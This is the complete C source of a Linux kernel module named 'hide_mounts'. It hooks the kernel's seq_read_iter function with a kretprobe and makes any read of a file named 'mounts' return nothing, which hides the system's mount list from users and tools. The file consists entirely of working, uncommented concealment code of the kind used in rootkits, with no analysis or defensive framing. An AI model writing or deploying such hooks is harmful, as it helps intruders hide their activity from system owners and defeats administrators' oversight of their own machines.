#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/fs.h>
#include <linux/dcache.h>

MODULE_LICENSE("GPL");

static int entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    *(struct kiocb **)ri->data = (struct kiocb *)regs->regs[0];
    return 0;
}

static int ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct kiocb *iocb = *(struct kiocb **)ri->data;
    struct file *file;

    if (!iocb || !iocb->ki_filp || !iocb->ki_filp->f_path.dentry)
        return 0;

    file = iocb->ki_filp;
    if (strcmp(file->f_path.dentry->d_name.name, "mounts") == 0)
        regs->regs[0] = 0;

    return 0;
}

static struct kretprobe rp = {
    .kp.symbol_name = "seq_read_iter",
    .entry_handler = entry,
    .handler = ret,
    .data_size = sizeof(struct kiocb *),
    .maxactive = 64,
};

static int __init init_mod(void)
{
    int r = register_kretprobe(&rp);
    if (r < 0) return r;
    printk(KERN_INFO "hide_mounts: loaded\n");
    return 0;
}

static void __exit exit_mod(void)
{
    unregister_kretprobe(&rp);
    printk(KERN_INFO "hide_mounts: unloaded\n");
}

module_init(init_mod);
module_exit(exit_mod);
